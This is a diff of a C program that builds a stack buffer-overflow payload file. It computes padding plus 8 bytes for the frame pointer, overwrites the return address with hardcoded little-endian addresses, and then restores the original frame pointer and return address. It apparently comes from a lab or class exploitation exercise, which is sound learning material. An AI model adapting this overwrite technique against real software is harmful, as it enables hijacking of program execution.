@@ -76,7 +76,7 @@ int main(int argc, char *argv[]){
     exit(1);
   }
 
-  numChars = atoi(argv[1]); //+8 bytes for fp 
+  numChars = atoi(argv[1]) + 8; //+8 bytes for fp 
   
   if(file == NULL){
     printf("Error opening file. Exiting.");
@@ -95,7 +95,7 @@ int main(int argc, char *argv[]){
   //unsigned char * pTemp = littleEndian("0x1", 8);
   unsigned char* pTemp = littleEndian( "0x400550", 8 );
   //
-  fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   //fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   //write return address
   fwrite(retAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
@@ -112,10 +112,10 @@ int main(int argc, char *argv[]){
   //fwrite(littleEndian("0x7fffffffde28", 8), 1, 8, file);
   
   //rewrite original FP
-  //fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   
   //rewrite original return address
-  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);  
+  fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);  
   
   free(pTemp);
   free(mainRet);
